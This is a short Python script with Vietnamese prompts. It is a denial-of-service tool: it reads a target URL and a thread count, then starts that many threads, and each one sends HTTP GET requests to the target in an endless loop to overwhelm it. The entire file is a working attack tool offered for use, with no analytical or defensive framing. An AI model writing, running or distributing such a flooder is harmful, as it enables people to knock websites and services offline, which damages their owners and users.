import colorama
import threading
import requests

def dos(target):
    while True:
        try:
            res = requests.get(target)
            print("Yêu cầu đã được gửi!")
        except requests.exceptions.ConnectionError:
            print("[!!!] " + "Lỗi kết nối!")

threads = 100



url = input("Nhập URL>> ")

try:
    threads = int(input("Số lượng threads: "))
except ValueError:
    exit("Số lượng threads không hợp lệ!")

if threads == 0:
    exit("Số lượng threads không hợp lệ!")

if not url.__contains__("http"):
    exit("URL không chứa http hoặc https!")

if not url.__contains__("."):
    exit("Tên miền không hợp lệ!")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " threads đã được khởi động!")